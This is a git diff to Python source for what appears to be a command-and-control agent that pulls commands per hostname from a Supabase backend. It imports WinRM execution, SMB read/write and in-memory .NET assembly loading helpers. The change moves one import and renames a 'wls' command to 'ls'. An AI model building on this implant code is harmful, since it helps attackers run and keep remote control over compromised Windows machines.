@@ -5,15 +5,15 @@ from .commands import update_command_status, fetch_pending_commands_for_hostname
 from .file_operations import handle_download_command, handle_upload_command, fetch_pending_uploads, download_from_supabase
 from .system_info import get_system_info
 from .config import SUPABASE_KEY
-from utils.winapi.netexec import load_dotnet_assembly  # Import the netexec function
 
 # Conditional import based on the operating system
 if os.name == 'nt':  # 'nt' indicates Windows
-    from utils.winapi import wls, list_users_in_group, smb_write
+    from utils.winapi import ls, list_users_in_group, smb_write
     from utils.winapi.smb_get import smb_get  # Ensure correct import
     from utils.winapi.winrm_execute import winrm_execute  # Import the winrm_execute function
     from utils.winapi.pwd import wpwd  # Import the wpwd function
     from utils.winapi.wami import wami  # Import the wami function
+    from utils.winapi.netexec import load_dotnet_assembly  # Import the netexec function
 
 def handle_kill_command(command_id, command_text, hostname, supabase: Client):
     """Handles the kill command, updates the command status to 'Completed', marks the agent as 'Dead', and exits."""
@@ -82,11 +82,11 @@ def execute_commands(supabase: Client):
             if command_text.lower().startswith('kill'):
                 handle_kill_command(command_id, command_text, hostname, supabase)
 
-            # Handle 'wls' command only if on Windows
-            elif os.name == 'nt' and command_text.lower().startswith('wls'):
+            # Handle 'ls' command only if on Windows
+            elif os.name == 'nt' and command_text.lower().startswith('ls'):
                 try:
-                    path = command_text.split(' ', 1)[1]  # Expecting command to be in format "wls [path]"
-                    result = wls(path)
+                    path = command_text.split(' ', 1)[1]  # Expecting command to be in format "ls [path]"
+                    result = ls(path)
                     status = 'Completed'
                     output = "\n".join(result)
                 except Exception as e:
